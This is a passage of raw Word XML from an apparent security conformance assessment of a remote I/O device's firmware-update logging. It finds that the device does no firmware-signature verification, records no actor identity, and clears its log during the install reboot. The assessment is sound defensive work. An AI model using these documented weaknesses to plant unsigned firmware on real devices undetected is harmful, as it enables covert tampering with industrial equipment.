                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> with time/actor </w:t>
            </w:r>
            <w:hyperlink r:id="rId185" w:history="1">
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00DC3DB6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02207B" w:rsidRPr="00DC3DB6" w14:paraId="3EB3C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65F95" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="sv-SE"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="sv-SE"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="sv-SE"/>
              </w:rPr>
              <w:t>firmware</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="sv-SE"/>
              </w:rPr>
              <w:t>/version + I&amp;M0 SOFTWARE_REVISION delta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DAC40" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>SRIO-2953/3015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5D3EA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i/>
                <w:iCs/>
              </w:rPr>
              <w:t>That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firmware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version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changed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F887C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>Indirect state-delta; no when/who/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>authorised</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId186" w:history="1">
              <w:r w:rsidRPr="00DC3DB6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DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00DC3DB6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02207B" w:rsidRPr="00DC3DB6" w14:paraId="13D5F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30938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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Update-state LED sequence</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (US green/FS on fail)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56FED" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>SRIO-11359/15512/15511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3B4FC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t>Local</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">, transient </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>visual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indication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2F1E1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Not recorded </w:t>
            </w:r>
            <w:hyperlink r:id="rId187" w:history="1">
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="00DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00DC3DB6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02207B" w:rsidRPr="0002207B" w14:paraId="2F763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41B3D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>Debug/test port fused in production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5C08F" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>SRIO-2580/1526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92024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t>Removes</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> a </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>modification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path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2D806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 xml:space="preserve">EDR 2.13 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>exclusion</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>no</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>entry</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:hyperlink r:id="rId188" w:history="1">
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[100_SRIO_P...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId189" w:history="1">
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[209_SRIO_C...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="7EEBA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00471" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="26" w:author="Unknown">
              <w:r w:rsidRPr="0002207B">
                <w:delText>I&amp;M0 REVISION_COUNTER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75B8A" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>SRIO-3002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F739C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REMOVED → RQ-009 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>config</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>modification</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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2DD2B" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="6404B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4D6D5" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:del w:id="27" w:author="Unknown">
              <w:r w:rsidRPr="0002207B">
                <w:delText>I&amp;M4 signature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288C2" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>SRIO-3011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58372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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>REMOVED → RQ-009/RQ-004 (config fingerprint)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087C0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</w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="247B38E0" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Gaps (software-intervention-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>scoped</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0002207B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2641A6AB" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-1 (attribution — accurate, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Events recorded </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>without actor identity</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; no user auth on the FW-update path → </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>CR 2.12 unmet</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. An illegitimate software intervention avoiding an official path is unrecorded and unattributable. </w:t>
      </w:r>
      <w:hyperlink r:id="rId190" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3FA3B7ED" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-2 (legitimate-vs-illegitimate indistinguishable — re-framed as evidence-classification).</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-008 demands evidence of </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>both legitimate AND illegitimate</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> intervention. The evidence footprint of a genuine update and a modified/unsigned image is </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>identical</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ("update completed" + version change). </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Cause:</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the device performs </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no firmware-signature verification</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — but </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>that protection gap is RQ-005 (TC-RQ005-03)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; here the finding is that </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> cannot classify</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the two, so the "legitimate OR illegitimate" obligation is unmet. </w:t>
      </w:r>
      <w:hyperlink r:id="rId191" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="06D3D5B8" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-3 (self-erasing install — decisive, evidence-scoped).</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> /firmware/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>install</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"initiates</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> a reboot to install"</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-2953) and Exit-Update requires a </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>power reset</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-9916); a cold start </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>clears the log</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (SRIO-6521) and resets uptime (SRIO-15398). </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The act of installing software destroys the log evidence of that installation</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the update mechanism is inherently self-</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>erasing.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(The 5-year retention dimension of this same mechanism → RQ-012.)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId192" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="07BAA66D" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>G-4 (debug/test port — accurate, keep).</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Fusing = </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EDR 2.13</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> exclusion; a re-probe still generates </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no log entry</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId193" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[100_SRIO_P...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1E8F4804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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SL/conformance conclusion (software-intervention-scoped):</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-008 is </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>not met</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> for genuine intervention evidence. The log is </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>readable (CR 6.1 met)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> but provides </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no actor attribution (CR 2.12)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no absolute/persistent time (CR 2.11)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no protection/retention (CR 3.9 — actively self-erased by the install reboot, G-3)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no legitimate/illegitimate classification (CR 2.8 intent, G-2)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(Config-modification evidence → RQ-009; firmware-protection cause of G-2 → RQ-005; 5-year retention → RQ-012.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79CA7F91" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="0002207B">
        <w:pict w14:anchorId="57E66574">
          <v:rect id="_x0000_i1542" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="688CCDC4" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 2 — Methodological Test Planning (Scope-Corrected)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4427"/>
        <w:gridCol w:w="1753"/>
        <w:gridCol w:w="1945"/>
        <w:gridCol w:w="623"/>
      </w:tblGrid>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="0FEBC2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BECE36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F9F10B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A0FD8D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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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2BD9CC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 xml:space="preserve">Scientific </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
